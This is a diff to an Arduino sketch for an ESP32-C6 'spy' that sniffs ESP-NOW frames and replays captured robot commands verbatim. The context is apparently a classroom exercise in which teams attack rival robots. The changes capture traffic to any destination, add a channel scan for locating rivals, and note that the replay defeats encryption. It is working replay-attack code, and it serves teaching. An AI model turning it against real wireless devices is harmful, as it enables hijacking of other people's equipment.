@@ -1,19 +1,24 @@
 // espiao_monitor_xiao_term.ino - ESPIAO em MODO MONITOR num XIAO ESP32-C6,
 // controlado PELO TERMINAL (Serial 115200).
 //
-// Captura todo frame ESP-NOW do canal (broadcast ou unicast para o robo), guarda um
-// historico numerado e deixa o aluno escolher, pelo terminal, QUAL pacote repetir.
-// O replay e VERBATIM (reenvia os bytes exatos): funciona em texto claro, em unicast
-// e tambem contra a cifra (controle_cripto.py) - o espiao nao entende, mas repete.
+// Captura todo frame ESP-NOW do canal (broadcast ou unicast, para QUALQUER destino),
+// guarda um historico numerado e deixa o aluno escolher, pelo terminal, QUAL pacote
+// repetir. O replay e VERBATIM (reenvia os bytes exatos) e vai para o MESMO destino do
+// pacote original: funciona em texto claro, em unicast e tambem contra a cifra - o
+// espiao nao entende, mas repete. Nao precisa saber o MAC do robo: ele aparece na captura.
+//
+// Corrida (varias equipes, uma por canal 1/6/11): o espiao ataca os RIVAIS.
+// Primeiro descubra em que canal eles estao (v = varredura), depois mude (k <n>).
 //
 // Comandos (digite e tecle Enter):
 //   l        lista o historico
 //   <n>      repete o pacote numero n           ex.: 7
 //   <n> xK   repete o pacote n, K vezes          ex.: 7 x3
 //   u        repete o ultimo pacote capturado
-//   k<n>     sintoniza o canal n (1..13); so ouve/repete no canal atual
 //   m        liga/desliga a impressao ao vivo das capturas (o historico continua)
 //   c        limpa o historico
+//   v        varre os canais 1-13 e conta pacotes ESP-NOW em cada um
+//   k <n>    muda para o canal n (fica gravado: vale apos reiniciar)  ex.: k 6
 //   h        ajuda
 // Botao BOOT = repete o ultimo pacote (atalho fisico).
 //
@@ -27,12 +32,11 @@
 #include <WiFi.h>
 #include "esp_wifi.h"
 #include "esp_now.h"
+#include <Preferences.h>
 
 // ====================== CONFIGURACAO ======================
-static uint8_t CANAL = 1;                     // canal atual (troque pelo terminal: k<n>)
-
-// MAC do ROBO: destino do replay. Descubra com ferramentas/mostra_mac.py no robo.
-static uint8_t ROBO_MAC[6] = { 0x48, 0x27, 0xe2, 0xe3, 0xac, 0x78 };
+static const uint8_t CANAL_PADRAO = 1;        // canal na 1a vez; depois vale o gravado (k <n>)
+static const int     VARRE_MS = 700;          // tempo ouvindo cada canal na varredura
 
 #ifndef LED_BUILTIN
 #define LED_BUILTIN 15
@@ -48,6 +52,7 @@ static const uint8_t BROADCAST[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
 
 struct Cap {
   uint8_t  src[6];
+  uint8_t  dst[6];
   uint8_t  body[BODY_MAX];
   uint8_t  len;
   bool     bcast;
@@ -66,6 +71,10 @@ static Cap  hist[HIST_N];
 static long total = 0;                        // id do ultimo pacote guardado
 static long base  = 1;                        // menor id ainda disponivel (apos "c")
 static bool ao_vivo = true;
+static uint8_t canal = CANAL_PADRAO;
+static volatile bool varrendo = false;        // na varredura so conta, nao guarda
+static volatile uint32_t conta_varre = 0;
+static Preferences prefs;
 
 // ------------------------------------------------------------------ util
 static void ledSet(bool on) {
@@ -86,21 +95,26 @@ static void macStr(const uint8_t* m, char* out) {
 static const char* nomeComando(const Cap& c) {
   if (c.len == 1) {
     switch (c.body[0]) {
-      case 'F': return "FRENTE";
-      case 'T': return "TRAS";
-      case 'E': return "ESQ";
-      case 'D': return "DIR";
-      case 'P': return "PARAR";
+      case 'F': return "FORWARD";
+      case 'T': return "BACK";
+      case 'E': return "LEFT";
+      case 'D': return "RIGHT";
+      case 'P': return "STOP";
     }
   }
-  return "? (ilegivel)";                      // ex.: cifrado
+  return "? (unreadable)";                      // ex.: cifrado
 }
 
 static void imprimeCap(const Cap& c) {
   char mac[18]; macStr(c.src, mac);
-  Serial.printf("#%-3ld %7.1fs  %s  de %s  %ddBm  %2dB  %-12s  ",
-                c.id, c.ms / 1000.0, c.bcast ? "BCAST" : "UNI  ",
-                mac, c.rssi, c.len, nomeComando(c));
+  if (c.bcast) {
+    Serial.printf("#%-3ld %7.1fs  BCAST                      from %s  %ddBm  %2dB  %-12s  ",
+                  c.id, c.ms / 1000.0, mac, c.rssi, c.len, nomeComando(c));
+  } else {
+    char dst[18]; macStr(c.dst, dst);
+    Serial.printf("#%-3ld %7.1fs  UNI to %s  from %s  %ddBm  %2dB  %-12s  ",
+                  c.id, c.ms / 1000.0, dst, mac, c.rssi, c.len, nomeComando(c));
+  }
   for (int i = 0; i < c.len; i++) Serial.printf("%02x", c.body[i]);
   Serial.println();
 }
@@ -123,10 +137,10 @@ static void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (p[34] != 0x18 || p[35] != 0xFE || p[36] != 0x34) return;  // OUI Espressif
   if (p[37] != 0x04) return;                  // tipo ESP-NOW
 
+  if (varrendo) { conta_varre++; return; }
+
   const uint8_t* da = p + 4;
-  bool para_robo = (memcmp(da, ROBO_MAC, 6) == 0);
-  bool bcast     = (memcmp(da, BROADCAST, 6) == 0);
-  if (!para_robo && !bcast) return;
+  bool bcast = (memcmp(da, BROADCAST, 6) == 0);
 
   int bodylen = p[33] - 5;
   if (bodylen < 1) return;
@@ -137,6 +151,7 @@ static void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (next == q_tail) return;
   Cap& c = q[q_head];
   memcpy(c.src, p + 10, 6);
+  memcpy(c.dst, da, 6);
   memcpy(c.body, p + 39, bodylen);
   c.len   = bodylen;
   c.bcast = bcast;
@@ -146,43 +161,69 @@ static void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
 }
 
 // ------------------------------------------------------------------ replay
+// Registra o destino como peer (canal 0 = canal atual do radio), se ainda nao existe.
+static void garantePeer(const uint8_t* mac) {
+  if (esp_now_is_peer_exist(mac)) return;
+  esp_now_peer_info_t peer = {};
+  memcpy(peer.peer_addr, mac, 6);
+  peer.channel = 0;
+  peer.ifidx   = WIFI_IF_STA;
+  peer.encrypt = false;
+  esp_now_add_peer(&peer);
+}
+
 static void replay(long id, int vezes) {
   Cap* c = buscaId(id);
-  if (!c) { Serial.printf("pacote #%ld nao esta no historico (use l)\n", id); return; }
+  if (!c) { Serial.printf("packet #%ld is not in the history (use l)\n", id); return; }
+  char dst[18]; macStr(c->dst, dst);
+  garantePeer(c->dst);
   for (int i = 0; i < vezes; i++) {
-    esp_err_t r = esp_now_send(ROBO_MAC, c->body, c->len);
-    Serial.printf("REPLAY #%ld -> robo  %s  (%s)\n", id, nomeComando(*c),
-                  r == ESP_OK ? "ok" : "falhou");
+    esp_err_t r = esp_now_send(c->dst, c->body, c->len);
+    Serial.printf("REPLAY #%ld -> %s  %s  (%s)\n", id, c->bcast ? "BROADCAST" : dst,
+                  nomeComando(*c), r == ESP_OK ? "ok" : "failed");
     ledPisca(2, 40);
     if (i + 1 < vezes) delay(300);
   }
 }
 
-// ------------------------------------------------------------------ canal
-static void setCanal(int n) {
-  if (n < 1 || n > 13) { Serial.printf("canal invalido: %d (use 1..13)\n", n); return; }
-  CANAL = (uint8_t)n;
-  esp_wifi_set_channel(CANAL, WIFI_SECOND_CHAN_NONE);
-  esp_now_peer_info_t peer = {};
-  memcpy(peer.peer_addr, ROBO_MAC, 6);
-  peer.channel = CANAL;
-  peer.ifidx   = WIFI_IF_STA;
-  peer.encrypt = false;
-  esp_now_mod_peer(&peer);            // o replay precisa sair no canal novo
-  Serial.printf("canal: %d\n", CANAL);
+// ------------------------------------------------------------------ canais
+static void mudaCanal(int n, bool gravar) {
+  canal = n;
+  esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
+  if (gravar) { prefs.putUChar("canal", canal); }
+  Serial.printf("channel %d%s\n", canal, gravar ? " (saved)" : "");
+}
+
+static void varre() {
+  uint8_t original = canal;
+  Serial.println("scanning channels (ESP-NOW packets heard on each):");
+  varrendo = true;
+  for (int ch = 1; ch <= 13; ch++) {
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    conta_varre = 0;
+    delay(VARRE_MS);
+    uint32_t n = conta_varre;
+    Serial.printf("  channel %2d: %3lu  ", ch, (unsigned long)n);
+    for (uint32_t i = 0; i < n && i < 40; i++) Serial.print('#');
+    Serial.println();
+  }
+  varrendo = false;
+  esp_wifi_set_channel(original, WIFI_SECOND_CHAN_NONE);
+  Serial.printf("back on channel %d (change with: k <n>)\n", original);
 }
 
 // ------------------------------------------------------------------ terminal
 static void ajuda() {
-  Serial.println("comandos: l=lista  <n>=repete #n  <n> xK=repete K vezes  u=ultimo");
-  Serial.println("          k<n>=canal 1..13  m=ao vivo  c=limpa  h=ajuda  (BOOT=ultimo)");
+  Serial.println("commands: l=list  <n>=replay #n  <n> xK=replay K times  u=last");
+  Serial.println("          v=scan channels  k <n>=switch to channel n");
+  Serial.println("          m=live on/off  c=clear  h=help   (BOOT = last)");
 }
 
 static void lista() {
-  if (total < base) { Serial.println("(historico vazio)"); return; }
+  if (total < base) { Serial.println("(history empty)"); return; }
   long ini = total - HIST_N + 1;
   if (ini < base) ini = base;
-  Serial.println("---- historico --------------------------------------------------------");
+  Serial.println("---- history ----------------------------------------------------------");
   for (long id = ini; id <= total; id++) { Cap* c = buscaId(id); if (c) imprimeCap(*c); }
   Serial.println("-----------------------------------------------------------------------");
 }
@@ -193,10 +234,16 @@ static void executa(char* s) {
   char k = tolower(*s);
   if (k == 'l') { lista(); return; }
   if (k == 'h' || k == '?') { ajuda(); return; }
-  if (k == 'u') { if (total >= base) replay(total, 1); else Serial.println("(nada capturado)"); return; }
-  if (k == 'm') { ao_vivo = !ao_vivo; Serial.printf("ao vivo: %s\n", ao_vivo ? "ligado" : "desligado"); return; }
-  if (k == 'c') { base = total + 1; Serial.println("historico limpo"); return; }
-  if (k == 'k') { setCanal((int)strtol(s + 1, nullptr, 10)); return; }
+  if (k == 'u') { if (total >= base) replay(total, 1); else Serial.println("(nothing captured)"); return; }
+  if (k == 'm') { ao_vivo = !ao_vivo; Serial.printf("live: %s\n", ao_vivo ? "on" : "off"); return; }
+  if (k == 'c') { base = total + 1; Serial.println("history cleared"); return; }
+  if (k == 'v') { varre(); return; }
+  if (k == 'k') {
+    int n = atoi(s + 1);
+    if (n < 1 || n > 13) { Serial.println("channel 1 to 13, e.g.: k 6"); return; }
+    mudaCanal(n, true);
+    return;
+  }
   if (*s == '#') s++;
   if (isdigit((unsigned char)*s)) {
     long id = strtol(s, &s, 10);
@@ -206,7 +253,7 @@ static void executa(char* s) {
     replay(id, vezes);
     return;
   }
-  Serial.printf("comando desconhecido: %s\n", s);
+  Serial.printf("unknown command: %s\n", s);
   ajuda();
 }
 
@@ -234,30 +281,26 @@ void setup() {
   Serial.begin(115200);
   delay(200);
 
+  prefs.begin("espiao", false);
+  canal = prefs.getUChar("canal", CANAL_PADRAO);
+  if (canal < 1 || canal > 13) canal = CANAL_PADRAO;
+
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
-  esp_wifi_set_channel(CANAL, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
 
-  if (esp_now_init() == ESP_OK) {
-    esp_now_peer_info_t peer = {};
-    memcpy(peer.peer_addr, ROBO_MAC, 6);
-    peer.channel = CANAL;
-    peer.ifidx   = WIFI_IF_STA;
-    peer.encrypt = false;
-    esp_now_add_peer(&peer);
-  }
+  if (esp_now_init() == ESP_OK) garantePeer(BROADCAST);
 
   wifi_promiscuous_filter_t filtro = {};
   filtro.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
   esp_wifi_set_promiscuous_filter(&filtro);
   esp_wifi_set_promiscuous_rx_cb(&sniffer);
   esp_wifi_set_promiscuous(true);
-  esp_wifi_set_channel(CANAL, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
 
-  char mac[18]; macStr(ROBO_MAC, mac);
   Serial.println("========================================");
-  Serial.println("ESPIAO monitor (XIAO ESP32-C6) - terminal");
-  Serial.printf("Canal %d  destino replay %s\n", CANAL, mac);
+  Serial.println("SPY monitor (XIAO ESP32-C6) - terminal");
+  Serial.printf("Channel %d  (replay goes to each packet's original destination)\n", canal);
   ajuda();
   Serial.println("========================================");
   ledPisca(2, 150);
